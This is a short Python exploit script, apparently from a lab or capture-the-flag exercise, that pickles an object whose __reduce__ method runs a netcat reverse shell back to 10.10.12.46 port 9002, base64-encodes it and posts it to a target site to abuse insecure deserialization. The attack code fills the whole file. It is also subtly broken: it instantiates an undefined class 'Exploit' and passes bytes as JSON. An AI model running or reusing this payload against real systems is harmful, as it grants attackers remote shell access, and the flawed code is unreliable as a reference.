import os
import pickle
from hashlib import md5
import requests
import base64


class payload(object):
    def __reduce__(self):
        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.12.46 9002 >/tmp/f',))   #reverse shell code


def serialize_exploit():
    shellcode = pickle.dumps(Exploit())   #pickle serialization of payload
    return shellcode


def insecure_deserialize(exploit_code):   #deserialization of pickle and execution of they payload
    pickle.loads(exploit_code)


if __name__ == '__main__':
    shellcode = serialize_exploit()
    b64shellcode = base64.b64encode(shellcode)   #base64 encoding to send
    r = requests.post("http://wwww.vulnerablesite.com", json = b64shellcode)    #post it to target vulnerable site
